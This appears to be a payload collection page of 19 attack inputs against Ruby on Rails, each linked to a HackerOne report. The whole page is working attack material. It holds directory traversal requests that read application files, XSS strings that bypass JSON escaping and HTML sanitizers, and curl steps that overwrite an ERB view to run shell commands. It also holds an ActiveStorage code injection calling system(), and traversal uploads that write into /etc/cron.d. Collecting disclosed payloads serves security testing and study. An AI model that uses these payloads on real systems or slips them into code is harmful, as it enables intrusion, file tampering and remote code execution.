# Ruby on Rails

19 payloads.

### `864c46b2`

```
GET /help/../../../Gemfile
```

— [Directory traversal attack in view resolver](https://hackerone.com/reports/3370) · Ruby on Rails · [lautis](https://hackerone.com/lautis)

### `b9366b3a`

```
GET /help/%5c../%5c../%5c../Gemfile
```

— [Directory traversal attack in view resolver](https://hackerone.com/reports/3370) · Ruby on Rails · [lautis](https://hackerone.com/lautis)

### `abdd7f4a`

```
<script>
//<![CDATA[
var json={"</script><script>alert(1)//":"xss"}
//]]>
</script>
```

— [JSON keys are not properly escaped](https://hackerone.com/reports/47280) · Ruby on Rails · [einstein_](https://hackerone.com/einstein_)

### `11db8b9c`

```
{"</script><script>alert(1)//"=>"xss"}
```

— [JSON keys are not properly escaped](https://hackerone.com/reports/47280) · Ruby on Rails · [einstein_](https://hackerone.com/einstein_)

### `8d7d5852`

```
<script>let a = `<%= j '`+alert`' %>`</script>
```

— [XSS due to incomplete JS escaping](https://hackerone.com/reports/474262) · Ruby on Rails · [jessecampos](https://hackerone.com/jessecampos)

### `3fdbb975`

```
<script>let a = `<%= j '${alert()}' %>`</script>
```

— [XSS due to incomplete JS escaping](https://hackerone.com/reports/474262) · Ruby on Rails · [jessecampos](https://hackerone.com/jessecampos)

### `933a90a9`

```
❯ curl "http://localhost:3000/books/1%2f%2e%2e%2f%2e%2e%2f%2e%2e%2ftest"

# test file is generated
❯ ls
app  config     db       Gemfile.lock  log           public    target.com  test       tmp
bin  evil.com  Gemfile  lib           package.json  Rakefile  storage    test.html  vendor


❯ curl "http://localhost:3000/books/1%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fREADME%2emd"

# If the file exists it will be overwritten
❯ cat target.com
...
<p>
  <strong>Name:</strong>
  &lt;% `touch me` %&gt;
</p>
...
```

— [File writing by Directory traversal at actionpack-page_caching and RCE by it](https://hackerone.com/reports/519220) · Ruby on Rails · [ooooooo_q](https://hackerone.com/ooooooo_q) · $1,000.0

### `ac120a7e`

```
# overwrite erb
❯ curl "http://localhost:3000/books/1%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fapp%2fviews%2fbooks%2fshow%2etext%2eerb?format=text"
name: <% `touch me` %>

❯ cat app/views/books/show.text.erb
name: <% `touch me` %>


# executed `touch me`
❯ curl "http://localhost:3000/books/1.txt"
name:

# me file is generated
❯ ls
app  config     db       Gemfile.lock  log  package.json  Rakefile   storage  test.html  vendor
bin  target.com  Gemfile  lib           me   public        evil.com  test     tmp
```

— [File writing by Directory traversal at actionpack-page_caching and RCE by it](https://hackerone.com/reports/519220) · Ruby on Rails · [ooooooo_q](https://hackerone.com/ooooooo_q) · $1,000.0

### `42d158ea`

```
<?xml version="1.0" encoding="UTF-8"?>
<svg xmlns='http://target.com/2000/svg' width="200px" height="200px" onload="javascript:alert(location)">
</svg>
```

**Parameter:** `image`
— [XSS by file (Active Storage `Proxying`)](https://hackerone.com/reports/949513) · Ruby on Rails · [ooooooo_q](https://hackerone.com/ooooooo_q) · $500.0

### `1a2933da`

```
https://example.com/controller?t=eval&v=system("touch /tmp/hacked")
```

**Parameter:** `v`
— [Argument/Code Injection via ActiveStorage's image transformation functionality](https://hackerone.com/reports/1154034) · Ruby on Rails · [gquadros_](https://hackerone.com/gquadros_)

### `e2bc58ec`

```
http://...?payload=something="something"><img src="/nonexistent" onerror="alert(1)"><div class
```

**Parameter:** `payload`
— [XSS vulnerabilities due to missing checks in tag helpers](https://hackerone.com/reports/1444151) · Ruby on Rails · [amartinfraguas](https://hackerone.com/amartinfraguas)

### `585e021f`

```
<select><style><script>alert("XSS")</script></style></select>
```

**Parameter:** `name`
— [Incomplete fix for CVE-2022-32209 (XSS in Rails::Html::Sanitizer under certain configurations)](https://hackerone.com/reports/1654310) · Ruby on Rails · [0b5cur17y](https://hackerone.com/0b5cur17y)

### `62ed5666`

```
<svg><style><script>alert(1)</script></style></svg>
```

— [Rails::Html::SafeListSanitizer vulnerable to XSS when certain tags are allowed (math+style || svg+style)](https://hackerone.com/reports/1656627) · Ruby on Rails · [0b5cur17y](https://hackerone.com/0b5cur17y)

### `4a99d94b`

```
<math><style><img src=x onerror=alert(1)></style></math>
```

— [Rails::Html::SafeListSanitizer vulnerable to XSS when certain tags are allowed (math+style || svg+style)](https://hackerone.com/reports/1656627) · Ruby on Rails · [0b5cur17y](https://hackerone.com/0b5cur17y)

### `61ac00ff`

```
http://localhost:8888/poc2?name=%3Cmath%3E%3Cstyle%3E%3Cimg%20src=x%20onerror=alert(1
```

**Parameter:** `name`
— [Rails::Html::SafeListSanitizer vulnerable to XSS when certain tags are allowed (math+style || svg+style)](https://hackerone.com/reports/1656627) · Ruby on Rails · [0b5cur17y](https://hackerone.com/0b5cur17y)

### `af83d205`

```
http://localhost:3000/vuln?redirect_url=javascript:alert()%08
```

**Parameter:** `redirect_url`
— [Incorrect handling of certain characters passed to the redirection functionality in Rails can lead to a single-click XSS vulnerability.](https://hackerone.com/reports/1955370) · Ruby on Rails · [meowday](https://hackerone.com/meowday)

### `69cbb6a9`

```
POST /api/v1/documents HTTP/1.1
Content-Type: application/json

{
  "file_data": "KiBldmlsIGNyb250YWIgZW50cnkK",
  "filename": "notes.txt",
  "content_type": "text/plain",
  "path": "../../../../etc/cron.d/backdoor"
}
```

**Parameter:** `path`
— [ActiveStorage Disk Service Path Traversal via Custom Blob Key Injection](https://hackerone.com/reports/3580511) · Ruby on Rails · [ksw9722](https://hackerone.com/ksw9722)

### `15d1bb75`

```
POST /assets HTTP/1.1
Content-Type: multipart/form-data

avatar[filename]=photo.jpg
avatar[content_type]=image/jpeg
avatar[key]=../../../../../../tmp/malicious_payload
file=@payload.jpg
```

**Parameter:** `avatar[key]`
— [ActiveStorage Disk Service Path Traversal via Custom Blob Key Injection](https://hackerone.com/reports/3580511) · Ruby on Rails · [ksw9722](https://hackerone.com/ksw9722)

### `9b8e8bfb`

```
{ "user": { "avatar": { "io": ..., "filename": "x.jpg", "key": "../../sensitive" } } }
```

**Parameter:** `avatar[key]`
— [ActiveStorage Disk Service Path Traversal via Custom Blob Key Injection](https://hackerone.com/reports/3580511) · Ruby on Rails · [ksw9722](https://hackerone.com/ksw9722)
